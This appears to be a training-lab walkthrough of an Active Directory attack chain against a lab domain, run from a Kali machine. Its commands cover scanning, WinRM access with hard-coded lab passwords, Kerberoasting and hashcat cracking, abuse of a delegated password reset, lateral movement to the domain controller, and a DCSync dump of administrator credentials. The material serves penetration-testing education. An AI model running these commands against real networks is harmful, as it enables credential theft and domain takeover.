# Kali Linux - Attacker Machine

> All commands below are intended only for the isolated `adlab.local` training environment.

---

## 1. Test Connectivity

Test connectivity to DC01:

```bash
ping -c 3 10.0.0.10
```

Test connectivity to WS01:

```bash
ping -c 3 10.0.0.20
```

---

## 2. Configure Hostname Resolution

Add the lab systems to `/etc/hosts`:

```bash
sudo tee -a /etc/hosts >/dev/null <<'EOF'
10.0.0.10 dc01.adlab.local dc01
10.0.0.20 ws01.adlab.local ws01
EOF
```

---

## 3. Update Kali Linux

```bash
sudo apt update
```

---

## 4. Install Required Tools

Install the required penetration-testing tools:

```bash
sudo apt install -y nmap hashcat evil-winrm impacket-scripts
```

Install `pipx` if required:

```bash
sudo apt install -y pipx
```

Install Impacket:

```bash
pipx install impacket
```

Update the PATH:

```bash
pipx ensurepath
```

---

## 5. Scan DC01 and WS01

Scan common Active Directory and remote-management ports:

```bash
nmap -Pn -sT -p 53,88,135,139,389,445,464,636,3268,5985 10.0.0.10 10.0.0.20
```

---

## 6. Initial Access to WS01

Connect to WS01 using Alice's domain credentials:

```bash
evil-winrm -i 10.0.0.20 -u alice -p 'ComplexP@ssw0rd2026!#Secure'
```

Verify the current user:

```powershell
whoami
```

Verify the hostname:

```powershell
hostname
```

Display group memberships:

```powershell
whoami /groups
```

Display network configuration:

```powershell
ipconfig /all
```

Identify the Domain Controller:

```powershell
nltest /dsgetdc:adlab.local
```

---

## 7. Identify Kerberoastable Accounts

Query accounts with registered Service Principal Names:

```bash
GetUserSPNs.py -dc-ip 10.0.0.10 'ADLAB.LOCAL/alice:ComplexP@ssw0rd2026!#Secure'
```

---

## 8. Request the Kerberos Service Ticket

Request and save the TGS for the service account:

```bash
GetUserSPNs.py -dc-ip 10.0.0.10 'ADLAB.LOCAL/alice:ComplexP@ssw0rd2026!#Secure' -request -outputfile kerberoast.txt
```

Check the captured hash:

```bash
head -c 120 kerberoast.txt
```

---

## 9. Create the Lab Wordlist

Create a small controlled password list:

```bash
printf '%s\n' 'Summer2024!' 'Winter2024!' 'Password123!' 'SQLService2026!' > lab-wordlist.txt
```

Display the wordlist:

```bash
cat lab-wordlist.txt
```

---

## 10. Crack the Kerberoasted TGS

Perform the offline password-cracking test:

```bash
hashcat -m 13100 -a 0 kerberoast.txt lab-wordlist.txt
```

Display the recovered credential:

```bash
hashcat -m 13100 kerberoast.txt lab-wordlist.txt --show
```

---

## 11. Reset the backupsvc Password

Use the delegated Helpdesk permission through the compromised `svc_sql` account:

```bash
impacket-changepasswd -reset 'ADLAB.LOCAL/backupsvc@10.0.0.10' -newpass 'BackupNew2026!' -altuser 'ADLAB/svc_sql' -altpass 'Password123!' -protocol smb-samr
```

---

## 12. Validate backupsvc Credentials

```bash
GetUserSPNs.py -dc-ip 10.0.0.10 'ADLAB.LOCAL/backupsvc:BackupNew2026!'
```

---

## 13. Lateral Movement to DC01

Connect to the Domain Controller using the compromised `svc_sql` account:

```bash
evil-winrm -i 10.0.0.10 -u svc_sql -p 'Password123!'
```

Verify the current account:

```powershell
whoami
```

Verify the target system:

```powershell
hostname
```

---

## 14. Demonstrate DCSync Against da_admin

Request only the synthetic Domain Administrator credential material:

```bash
secretsdump.py -just-dc-user da_admin 'ADLAB.LOCAL/backupsvc:BackupNew2026!@10.0.0.10'
```

> **Important:** Redact NTLM hashes and Kerberos keys before publishing terminal screenshots or command output.

---
